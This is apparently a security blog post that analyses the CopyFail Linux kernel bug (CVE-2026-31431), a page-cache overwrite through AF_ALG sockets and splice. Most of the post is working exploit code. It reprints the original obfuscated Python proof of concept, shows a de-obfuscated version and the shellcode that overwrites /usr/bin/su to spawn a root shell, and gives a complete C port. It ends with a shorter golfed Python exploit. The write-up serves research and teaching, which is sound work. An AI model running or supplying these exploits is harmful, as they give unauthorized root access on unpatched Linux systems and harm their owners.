---
title: "Replicating & Analyzing CopyFail: CVE-2026-31431"
date: '2026-05-08T15:25:51-04:00'
author: "Me"
showToc: true
Tocopen: false
draft: false
comments: false

description: "Breaking down CopyFail and re-writing the PoC code in C, plus bonus features"

disableHLJS: true
hideSummary: false
ShowBreadCrumbs: true
ShowPostNavLinks: true
UseHugoToc: false
---
# Prelude
CopyFail, also known as CVE-2026-31431, is a controlled 4-byte overwrite to the Linux page cache, effectively granting an unlimited write-anywhere-on-the-filesystem primitive that can easily be used for privilege escalation, among other things. The original disclosure was by Xint and can be found [here](https://xint.io/blog/copy-fail-linux-distributions).

If you would like a more formal explanation on how this technique works, I would recommend reading the original article. This post serves as a walkthrough of how the PoC code works since I believe the code released by Xint was unnecessarily optimized and hard to immediately understand. This can probably be attributed to the claim that the payload is only "732 bytes" small, something they mention no less than five times, despite the fact that the payload could be much smaller (see [below](#code-golfing-for-fun--profit)).

The accompanying GitHub repository for my work is available [here](https://github.com/dacx910/CopyFailResearch/).

# The Original PoC
Below is the original PoC code released alongside the initial disclosure article:

```python
#!/usr/bin/env python3
import os as g,zlib,socket as s
def d(x):return bytes.fromhex(x)
def c(f,t,c):
 a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o)
 try:u.recv(8+t)
 except:0
f=g.open("/usr/bin/su",0);i=0;e=zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))
while i<len(e):c(f,i,e[i:i+4]);i+=4
g.system("su")
```

It is immediately apparent that this is not regular human Python programming and must have been minified/obfuscated. If we expand out the script a little and give everything appropriate names it looks a little something like this:

```python
#!/usr/bin/env python3
import os, zlib, socket
def d(x):
	return bytes.fromhex(x)

def exploit(targetFile, index, data):
	algSocket = socket.socket(38,5,0)
	algSocket.bind(("aead","authencesn(hmac(sha256),cbc(aes))"))
	
	h = 279
	algSocket.setsockopt(h, 1, d('0800010000000010'+'0'*64))
	algSocket.setsockopt(h,5,None,4)
	
	algConn,_ = algSocket.accept()
	dataSize = index+4
	i=d('00')
	algConn.sendmsg([b"A"*4+data], [(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),], 32768)
	
	readPipe,writePipe = os.pipe()
	os.splice(targetFile, writePipe, dataSize, offset_src=0)
	os.splice(readPipe, algConn.fileno(), dataSize)
	
	try:
		algConn.recv(8+index)
	except:
		0

targetFile = os.open("/usr/bin/su",0)
payload = zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))
i = 0
while i < len(payload):
	exploit(targetFile, i, payload[i:i+4])
	i += 4
os.system("su")
```

Here you can see the exploit taking shape, but there are still a lot of "magic numbers" that don't make it apparent what is actually being passed into these socket objects. The next thing I did was expand these numbers into their defined names.
```python
#!/usr/bin/env python3
import os, zlib, socket
def d(x):
	return bytes.fromhex(x)

def exploit(targetFile, index, data):
	algSocket = socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0)
	algSocket.bind(("aead","authencesn(hmac(sha256),cbc(aes))"))
	
	algSocket.setsockopt(socket.SOL_ALG, socket.ALG_SET_KEY, d('0800010000000010'+'0'*64))
	algSocket.setsockopt(socket.SOL_ALG, socket.ALG_SET_AEAD_AUTHSIZE, None, 4)
	
	algConn,_ = algSocket.accept()
	dataSize = index+4
	i = d('00')
	algConn.sendmsg([b"A"*4+data], [(socket.SOL_ALG, socket.ALG_SET_OP, i*4), (socket.SOL_ALG, socket.ALG_SET_IV, b'\x10'+i*19), (socket.SOL_ALG, socket.ALG_SET_AEAD_ASSOCLEN, b'\x08'+i*3),], socket.MSG_MORE)
	
	readPipe,writePipe = os.pipe()
	os.splice(targetFile, writePipe, dataSize, offset_src=0)
	os.splice(readPipe, algConn.fileno(), dataSize)
	
	try:
		algConn.recv(8+index)
	except:
		0

targetFile = os.open("/usr/bin/su","r")
payload = zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))
i = 0
while i < len(payload):
	exploit(targetFile, i, payload[i:i+4])
	i += 4
os.system("su")
```

Now we can at least identify the socket options it sets and some of the data it's passing in the sendmsg() call. However, sendmsg() is now very long and hard to read, so we can break that down into a better format.

`socket.sendmsg()` has the following format:
```python
socket.sendmsg(buffers, ancdata, flags, address)
```

We don't use the `address` argument, so our remaining three must belong to the `buffers`, `ancdata`, and `flags`. `buffers` is just our message, `ancdata` is *ancillary data* and are accompanying parameters that will tell the algorithm how to handle our input data, and `flags` is self-explanatory.

```python
payload = [b"A"*4+data]
ancdata = [
	(socket.SOL_ALG, socket.ALG_SET_OP, i*4),
	(socket.SOL_ALG, socket.ALG_SET_IV, b'\x10'+i*19),
	(socket.SOL_ALG, socket.ALG_SET_AEAD_ASSOCLEN, b'\x08'+i*3),
]
algConn.sendmsg(payload, ancdata, socket.MSG_MORE)
```
Much better.

The zlib binary blob can also be expanded to see that it is simply an ELF with accompanying shellcode.
```python
payload = b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00>\x00\x01\x00\x00\x00x\x00@\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x008\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x9e\x00\x00\x00\x00\x00\x00\x00\x9e\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x001\xc01\xff\xb0i\x0f\x05H\x8d=\x0f\x00\x00\x001\xf6j;X\x99\x0f\x051\xffj<X\x0f\x05/bin/sh\x00\x00\x00'
```

For those curious, that shellcode is:

```asm
BITS 64

global _start
section .text
_start:
	xor eax, eax
	xor edi, edi
	mov al, 0x69
	syscall
	lea rdi, [rel binsh]
	xor esi, esi
	push 0x3b
	pop rax
	cdq
	syscall
	xor edi, edi
	push 0x3c
	pop rax
	syscall

align 16
binsh:
	db "/bin/sh"
```

Putting this together we have our final expanded script that we can start to analyze.

```python
#!/usr/bin/env python3
import os, zlib, socket
def d(x):
	return bytes.fromhex(x)

def exploit(targetFile, index, data):
	algSocket = socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0)
	algSocket.bind(("aead","authencesn(hmac(sha256),cbc(aes))"))
	
	algSocket.setsockopt(socket.SOL_ALG, socket.ALG_SET_KEY, d('0800010000000010'+'0'*64))
	algSocket.setsockopt(socket.SOL_ALG, socket.ALG_SET_AEAD_AUTHSIZE, None, 4)
	
	algConn,_ = algSocket.accept()
	
	dataSize = index+4
	i = b'\x00'

	payload = [b"A"*4+data]
	ancdata = [
		(socket.SOL_ALG, socket.ALG_SET_OP, i*4),
		(socket.SOL_ALG, socket.ALG_SET_IV, b'\x10'+i*19),
		(socket.SOL_ALG, socket.ALG_SET_AEAD_ASSOCLEN, b'\x08'+i*3),
	]
	algConn.sendmsg(payload, ancdata, socket.MSG_MORE)
	
	readPipe,writePipe = os.pipe()
	os.splice(targetFile, writePipe, dataSize, offset_src=0)
	os.splice(readPipe, algConn.fileno(), dataSize)
	
	try:
		algConn.recv(8+index)
	except:
		0

targetFile = os.open("/usr/bin/su","r")
payload = b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00>\x00\x01\x00\x00\x00x\x00@\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x008\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x9e\x00\x00\x00\x00\x00\x00\x00\x9e\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x001\xc01\xff\xb0i\x0f\x05H\x8d=\x0f\x00\x00\x001\xf6j;X\x99\x0f\x051\xffj<X\x0f\x05/bin/sh\x00\x00\x00'
i = 0
while i < len(payload):
	exploit(targetFile, i, payload[i:i+4])
	i += 4
os.system("su")
```

There are still some ambiguous lines that are only ambiguous because of AF_ALG's implementation relying on C structs, which are fundamentally cumbersome in Python. This won't allow us to pretty-print code, but it does allow us to break down some of the ancillary data.

Looking at our first ancillary data, we send 4 null-bytes, which actually corresponds to a u32 of value 0, interpreted as ALG_OP_DECRYPT.
```python
(socket.SOL_ALG, socket.ALG_SET_OP, i*4) ->
(socket.SOL_ALG, socket.ALG_SET_OP, b'\x00\x00\x00\x00') ->
0 or ALG_OP_DECRYPT
```

Socket option `ALG_SET_IV` expects a `struct af_alg_iv` which is defined as:
```c
struct af_alg_iv {
	__u32	ivlen;
	__u8	iv[];
};
```
In our python code, we define this literally as `b'\x10\x00\x00\x00'+b'\x00'*16` where the first part is little-endian for integer '16' (our `ivlen`) and the next 16 bytes are null just to fill our `iv[]` array.

We can use the same little-endian analysis on `ALG_SET_AEAD_ASSOCLEN`.
```python
(socket.SOL_ALG, socket.ALG_SET_AEAD_ASSOCLEN, b'\x08'+i*3)
b'\x08\x00\x00\x00' -> u32 of '8'
```

Getting a better feel for how this code sends data over the wire makes it more apparent that most of this code exists to interface with the AF_ALG socket in a way that causes it to perform enough of its decryption to trigger the exploit. When working with raw sockets and kernel functions like we are in this exploit, I feel the C language does a better job at representing this attack path, so the next thing I did was begin working on converting this over to C.

# Converting to C
Constructing the base outline isn't too difficult since I originally wanted to stay as close to the Python structure as possible in order to help with debugging.
```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

char payload[] = "\x7f\x45\x4c\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x3e\x00\x01\x00\x00\x00\x78\x00\x40\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x38\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x9e\x00\x00\x00\x00\x00\x00\x00\x9e\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x31\xc0\x31\xff\xb0\x69\x0f\x05\x48\x8d\x3d\x0f\x00\x00\x00\x31\xf6\x6a\x3b\x58\x99\x0f\x05\x31\xff\x6a\x3c\x58\x0f\x05\x2f\x62\x69\x6e\x2f\x73\x68\x00\x00\x00";
#define PAYLOAD_LEN sizeof(payload)-1

int exploit(FILE *targetFile, size_t offset, char *segment, size_t segmentLength) {
	return 0;
}

int main(int argc, char *argv[], char *envp[]) {
	FILE *targetFile;
	
	targetFile = fopen("/usr/bin/su", "r");
	for (size_t i = 0; i < PAYLOAD_LEN; i += 4) {
		if (exploit(targetFile, i, payload+i, (i+4 > PAYLOAD_LEN) ? PAYLOAD_LEN-i : 4)) {
			fclose(targetFile);
			exit(1);
		}
	}

	fclose(targetFile);
	return 0;
}
```

Aside from a few modifications to account for the Python slicing, this will feed 4-byte chunks into exploit() and should provide all the data it needs for us to begin working on the meat of this project.

Thankfully, most of the Python socket() implementation follows the same calls we'll use in our C program. The basic call structure will be:

1. socket()
2. bind()
3. setsockopt(ALG_SET_KEY)
4. setsockopt(ALG_SET_AEAD_AUTHSIZE)
5. accept()
6. sendmsg()
7. pipe()
8. splice(targetFile, writePipe)
9. splice(readPipe, algConn)
10. recv()

Everything in between will be setting up the data structures for passing into function arguments.

A decent chunk of the work for this project was also figuring out the required header files since AF_ALG as a socket is not as well documented as AF_INET. To save trouble, this is what my final `#include` block looks like:

```c
#define _GNU_SOURCE
#define _FILE_OFFSET_BITS 64

#include <errno.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <linux/if_alg.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
```

Starting with setting up the algSocket object, we'll call `socket()`, `bind()`, and `setsockopt()`. I forgot to setup the key, but we won't represent this in a pretty struct like we will with the ancillary data because I'm fairly certain this is a raw AES key that doesn't represent nicely, so I leave it as is.
```c
char key[] = "\x08\x00\x01\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
#define KEY_LEN sizeof(key)-1

int exploit(FILE *targetFile, size_t offset, char *segment, size_t segmentLength) {
	int algSocket;
	struct sockaddr_alg sa = {0};

	algSocket = socket(AF_ALG, SOCK_SEQPACKET, 0);

	sa.salg_family = AF_ALG;
	memcpy(sa.salg_type, "aead", 5);
	memcpy(sa.salg_name, "authencesn(hmac(sha256),cbc(aes))", 34);
	bind(algSocket, (struct sockaddr*)&sa, sizeof(sa));

	setsockopt(algSocket, SOL_ALG, ALG_SET_KEY, key, KEY_LEN);
	setsockopt(algSocket, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, NULL, 4);

	return 0;
}
```

We can now set up the algConn object and send our message, which will be the heaviest part of replicating this in C due to the ancillary data.

```c
int algConn = accept(algSocket, NULL, 0);

struct msghdr msg = {0};
struct cmsghdr *cmsg;
struct iovec iov;
struct af_alg_iv* iv;
char cbuf[CMSG_SPACE(4)+CMSG_SPACE(20)+CMSG_SPACE(4)] = {0};
char data[8];

memcpy(data, "AAAA", 4);
memcpy(data+4, segment, segmentLength);

msg.msg_control = cbuf;
msg.msg_controllen = sizeof(cbuf);
cmsg = CMSG_FIRSTHDR(&msg);
cmsg->cmsg_level = SOL_ALG;
cmsg->cmsg_type = ALG_SET_OP;
cmsg->cmsg_len = CMSG_LEN(4);
*(unsigned int *)CMSG_DATA(cmsg) = ALG_OP_DECRYPT;

cmsg = CMSG_NXTHDR(&msg, cmsg);
cmsg->cmsg_level = SOL_ALG;
cmsg->cmsg_type = ALG_SET_IV;
cmsg->cmsg_len = CMSG_LEN(20);
iv = (void *)CMSG_DATA(cmsg);
iv->ivlen = 16;
memcpy(iv->iv, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 16);

cmsg = CMSG_NXTHDR(&msg, cmsg);
cmsg->cmsg_level = SOL_ALG;
cmsg->cmsg_type = ALG_SET_AEAD_ASSOCLEN;
cmsg->cmsg_len = CMSG_LEN(4);
*(unsigned int *)CMSG_DATA(cmsg) = 8;

iov.iov_base = data;
iov.iov_len = 8;
msg.msg_iov = &iov;
msg.msg_iovlen = 1;

sendmsg(algConn, &msg, MSG_MORE);
```

Finishing up we can perform our pipe(), splice(), and recv() to trigger the exploit.
```c
int p[2];
size_t dataSize = offset+4;
char *buf;
loff_t off_in = 0;

pipe(p);

splice(fileno(targetFile), &off_in, p[1], NULL, dataSize, 0);
splice(p[0], NULL, algConn, NULL, dataSize, 0);

buf = malloc(8+offset);
recv(algConn, buf, offset+8, 0);

close(p[0]);
close(p[1]);
close(algConn);
close(algSocket);
free(buf);
```

And now our final C program.

```c
#define _GNU_SOURCE
#define _FILE_OFFSET_BITS 64

#include <errno.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <linux/if_alg.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>

char payload[] = "\x7f\x45\x4c\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x3e\x00\x01\x00\x00\x00\x78\x00\x40\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x38\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x9e\x00\x00\x00\x00\x00\x00\x00\x9e\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x31\xc0\x31\xff\xb0\x69\x0f\x05\x48\x8d\x3d\x0f\x00\x00\x00\x31\xf6\x6a\x3b\x58\x99\x0f\x05\x31\xff\x6a\x3c\x58\x0f\x05\x2f\x62\x69\x6e\x2f\x73\x68\x00\x00\x00";
#define PAYLOAD_LEN sizeof(payload)-1

char key[] = "\x08\x00\x01\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
#define KEY_LEN sizeof(key)-1

int exploit(FILE *targetFile, size_t offset, char *segment, size_t segmentLength) {
	int algSocket;
	struct sockaddr_alg sa = {0};

	algSocket = socket(AF_ALG, SOCK_SEQPACKET, 0);

	sa.salg_family = AF_ALG;
	memcpy(sa.salg_type, "aead", 5);
	memcpy(sa.salg_name, "authencesn(hmac(sha256),cbc(aes))", 34);
	bind(algSocket, (struct sockaddr*)&sa, sizeof(sa));

	setsockopt(algSocket, SOL_ALG, ALG_SET_KEY, key, KEY_LEN);
	setsockopt(algSocket, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, NULL, 4);


	int algConn = accept(algSocket, NULL, 0);

	struct msghdr msg = {0};
	struct cmsghdr *cmsg;
	struct iovec iov;
	struct af_alg_iv* iv;
	char cbuf[CMSG_SPACE(4)+CMSG_SPACE(20)+CMSG_SPACE(4)] = {0};
	char data[8];

	memcpy(data, "AAAA", 4);
	memcpy(data+4, segment, segmentLength);

	msg.msg_control = cbuf;
	msg.msg_controllen = sizeof(cbuf);
	cmsg = CMSG_FIRSTHDR(&msg);
	cmsg->cmsg_level = SOL_ALG;
	cmsg->cmsg_type = ALG_SET_OP;
	cmsg->cmsg_len = CMSG_LEN(4);
	*(unsigned int *)CMSG_DATA(cmsg) = ALG_OP_DECRYPT;

	cmsg = CMSG_NXTHDR(&msg, cmsg);
	cmsg->cmsg_level = SOL_ALG;
	cmsg->cmsg_type = ALG_SET_IV;
	cmsg->cmsg_len = CMSG_LEN(20);
	iv = (void *)CMSG_DATA(cmsg);
	iv->ivlen = 16;
	memcpy(iv->iv, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 16);

	cmsg = CMSG_NXTHDR(&msg, cmsg);
	cmsg->cmsg_level = SOL_ALG;
	cmsg->cmsg_type = ALG_SET_AEAD_ASSOCLEN;
	cmsg->cmsg_len = CMSG_LEN(4);
	*(unsigned int *)CMSG_DATA(cmsg) = 8;

	iov.iov_base = data;
	iov.iov_len = 8;
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;

	sendmsg(algConn, &msg, MSG_MORE);


	int p[2];
	size_t dataSize = offset+4;
	char *buf;
	loff_t off_in = 0;

	pipe(p);

	splice(fileno(targetFile), &off_in, p[1], NULL, dataSize, 0);
	splice(p[0], NULL, algConn, NULL, dataSize, 0);

	buf = malloc(8+offset);
	recv(algConn, buf, offset+8, 0);

	close(p[0]);
	close(p[1]);
	close(algConn);
	close(algSocket);
	free(buf);
	return 0;
}

int main(int argc, char *argv[], char *envp[]) {
	FILE *targetFile;
	char *run[] = {"/usr/bin/su",NULL};
	
	targetFile = fopen("/usr/bin/su", "r");
	for (size_t i = 0; i < PAYLOAD_LEN; i += 4) {
		if (exploit(targetFile, i, payload+i, (i+4 > PAYLOAD_LEN) ? PAYLOAD_LEN-i : 4)) {
			fclose(targetFile);
			exit(1);
		}
	}

	fclose(targetFile);
	execve(run[0], run, NULL);
	return 0;
}
```

This code need additional error checking, but is otherwise viable. It represents the CopyFail exploit in a way that makes it easier for me to understand its operation. I was able to expand it to a pseudo-'cp' tool available [here](https://github.com/dacx910/CopyFailResearch/blob/main/cf.c) which allows you to copy one file to another via the CopyFail exploit, and in it I include the necessary error checking.

As a bonus, I wanted to see just how small the original exploit code could get.

# Code Golfing for Fun & ~~Profit~~
When I was analyzing the original PoC code, I noticed a trailing ',' where there didn't need to be one (it's in the ancillary data) and wondered why Xint decided to minify this code as much as possible if they were going for a small payload. I started looking closer and found several spots for improvement. This made me curious enough to see how much was left on the table and try my hand at "[code golfing](https://en.wikipedia.org/wiki/Code_golf)" since it wasn't something I'd ever done before.

I ended up finding a lot of neat optimizations, some more obvious than others (identifying them is an exercise I leave up to the reader), and got the payload down from 732 bytes to only **580 bytes** of Python code. It is available in the GitHub and below:
```python
#!/usr/bin/env python3
import os as g,zlib,socket as s,base64 as b
f=g.open("/usr/bin/su",0);i=9;z=b'\0';h=279;r,w=g.pipe();n=g.splice;e=zlib.decompress(b.b85decode('V_*OSCI&kOMj&0m-~i@BNL1j!U;$PG0w9_dO%|D+2j#(N1_20Vc);-ghD?4|k6v4T5cgY_b;L}5R>S{UHWB=+`bn92`o$SQ2><'),-9)
while c:=e[i-9:i-5]:
 i+=4;a=s.socket(38,5);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));v=a.setsockopt;v(h,1,b'\b\0\1\0\0\0\0\20'+z*64);v(h,5,0);u,_=a.accept();u.sendmsg([z*4+c],[(h,3,z*4),(h,2,b'\20'+z*19),(h,4,b'\b'+z*3)],8**5);n(f,w,i,0);n(r,u.fileno(),i)
 try:u.recv(4+i)
 except:0
g.system("su")
```

# Addendum
While writing this post the [Dirty Frag](https://github.com/V4bel/dirtyfrag) exploit came out, which was accompanied by some very nice PoC code written in C. Highly recommend checking that exploit out since it uses similar conventions as CopyFail.